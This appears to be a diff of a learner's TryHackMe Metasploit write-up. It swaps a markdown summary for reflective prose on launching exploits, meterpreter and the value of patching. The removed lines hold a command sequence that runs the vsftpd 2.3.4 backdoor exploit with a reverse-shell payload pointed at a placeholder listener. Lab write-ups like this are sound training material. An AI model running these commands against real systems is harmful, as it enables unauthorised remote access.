@@ -1,33 +1,11 @@
-# TryHackMe – Metasploit
+Room: Metasploit  
+    Username: siinon  
+    Difficulty: Easy  
 
-## 💣 Room Info
-- Room: [Metasploit](https://tryhackme.com/room/metasploitintro)
-- Username: siinon
-- Difficulty: Easy
+This room introduced me to the Metasploit Framework, one of the most well-known tools used in penetration testing. It walked me through how to launch a basic exploit using a known vulnerability and how to handle the payload once access was gained.
 
----
+I learned how to search for modules, set the right options like RHOSTS and payloads, and run the exploit to get a session. The process felt kind of like building blocks — you find the vulnerability, select the module, set the details, and then launch it.
 
-## 🧠 What I Learned
-- Got familiar with **Metasploit Framework**, a powerful tool used for exploitation and post-exploitation
-- Learned how to search for exploits, set payloads, and configure targets
-- Practiced exploiting a vulnerable system using a known exploit module
+One part that stood out was using `meterpreter`, which is a powerful post-exploitation shell that lets you do things like grab files, run keyloggers, or pivot to other machines once you’re inside a system.
 
----
-
-## 🛠️ Tools / Skills Practiced
-- Running `msfconsole` and using built-in Metasploit commands
-- Searching for exploit modules and matching them to discovered services
-- Setting options like RHOST, RPORT, and payload
-- Launching exploits and interacting with a remote shell
-
----
-
-## ⚙️ Common Metasploit Commands
-
-```bash
-search vsftpd                  # find relevant exploit
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS <target-ip>
-set PAYLOAD linux/x86/shell_reverse_tcp
-set LHOST <your-ip>
-exploit                        # launch the attack
+This room gave me a better understanding of how attackers can automate parts of an attack using Metasploit. It also helped me appreciate why patching known vulnerabilities and monitoring traffic is so important on the defensive side.
